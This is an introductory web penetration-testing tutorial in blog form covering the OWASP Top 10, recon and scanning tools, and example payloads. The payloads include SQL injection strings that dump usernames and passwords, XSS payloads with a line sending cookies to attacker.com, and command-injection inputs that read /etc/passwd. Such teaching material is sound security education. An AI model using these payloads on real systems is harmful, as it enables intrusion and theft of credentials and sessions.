---
title: "Web Application Penetration Testing Basics"
description: "Learn the fundamentals of web application security testing and common vulnerabilities"
author: "Verve Team"
date: "2024-01-25"
readTime: "8 min read"
tags: ["Web Security", "OWASP", "Pentesting"]
featured: false
---

# Web Application Penetration Testing Basics

Web applications are a common target for attackers. Understanding how to test them is essential for any security professional.

## The OWASP Top 10

The OWASP Top 10 is a standard awareness document for web application security. Key vulnerabilities include:

1. **Injection** - SQL, NoSQL, OS command injection
2. **Broken Authentication** - Session management flaws
3. **Sensitive Data Exposure** - Inadequate protection
4. **XML External Entities (XXE)** - XML processor vulnerabilities
5. **Broken Access Control** - Authorization issues
6. **Security Misconfiguration** - Default settings, verbose errors
7. **Cross-Site Scripting (XSS)** - Client-side injection
8. **Insecure Deserialization** - Remote code execution
9. **Using Components with Known Vulnerabilities** - Outdated libraries
10. **Insufficient Logging & Monitoring** - Delayed breach detection

## Testing Methodology

### 1. Information Gathering

```bash
# Subdomain enumeration
subfinder -d target.com
amass enum -d target.com

# Technology detection
whatweb https://target.com
wappalyzer
```

### 2. Vulnerability Scanning

```bash
# Nikto scan
nikto -h https://target.com

# Directory brute forcing
gobuster dir -u https://target.com -w /path/to/wordlist.txt
```

### 3. Manual Testing

Focus on business logic, authentication, and authorization flaws that automated tools miss.

## Common Vulnerabilities

### SQL Injection

```sql
-- Test for SQL injection
' OR '1'='1
admin' --
' UNION SELECT NULL--

-- Extract data
' UNION SELECT username, password FROM users--
```

### Cross-Site Scripting (XSS)

```javascript
// Reflected XSS test
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>

// Stored XSS
<script>fetch('http://attacker.com?c='+document.cookie)</script>
```

### Command Injection

```bash
# Test for command injection
; ls -la
| whoami
`cat /etc/passwd`
```

## Essential Tools

- **Burp Suite** - Web proxy and scanner
- **OWASP ZAP** - Free alternative to Burp
- **SQLMap** - Automated SQL injection tool
- **ffuf** - Fast web fuzzer
- **Nuclei** - Template-based scanner

## Practice Platforms

- **PortSwigger Web Security Academy** - Free labs
- **OWASP WebGoat** - Deliberately insecure application
- **TryHackMe** - Web security rooms
- **HackTheBox** - Vulnerable web applications

---

*Always get proper authorization before testing any web application!*
